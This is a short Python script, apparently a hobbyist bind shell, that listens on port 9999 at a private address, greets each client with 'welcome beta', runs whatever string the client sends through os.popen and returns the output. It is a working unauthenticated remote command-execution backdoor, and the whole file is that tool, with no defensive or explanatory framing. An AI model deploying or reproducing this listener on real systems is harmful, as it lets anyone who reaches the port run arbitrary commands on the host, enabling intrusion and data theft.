import socket
import os

s=socket.socket()
s.bind(('192.168.150.128',9999))
s.listen(1)
print("waiting for the connection")

while True : 
         c,addr=s.accept()
         print ("connected with ",addr)
         c.send(bytes("welcome beta ",'utf-8'))
         c.send (bytes("input",'utf-8'))
         cm=c.recv(1024).decode()
         stream=os.popen(cm)
         output=stream.read()
         c.send(bytes(str(output),'utf-8'))